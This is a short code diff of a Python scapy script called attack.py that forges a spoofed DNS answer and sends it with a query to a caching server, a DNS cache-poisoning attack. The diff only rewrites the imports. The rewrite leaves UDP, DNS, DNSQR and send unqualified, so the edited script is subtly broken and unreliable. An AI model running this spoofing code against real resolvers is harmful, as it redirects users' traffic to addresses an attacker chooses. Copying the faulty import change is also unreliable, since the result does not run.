@@ -1,4 +1,7 @@
-from scapy.all import *
+#!/usr/bin/env python3
+
+import sys
+import scapy.all
 
 if len(sys.argv) < 3:
     print("Usage: attack.py [target domain] [spoofed IP]")
@@ -17,7 +20,7 @@ d = DNS(id=0, qr=1, qd=DNSQR(qname=hostname), qdcount=1, ancount=1, nscount=0, a
 
 response = i / u / d
 
-request = IP(dst=cache_server_ip) / UDP(dport=53) / DNS(id=500, qr=0, rd=1, qdcount=1, qd=DNSQR(qname=hostname, qtype="A", qclass="IN"))
+request = scapy.all.IP(dst=cache_server_ip) / UDP(dport=53) / DNS(id=500, qr=0, rd=1, qdcount=1, qd=DNSQR(qname=hostname, qtype="A", qclass="IN"))
 
 send(response, verbose=0)
 send(request, verbose=0)
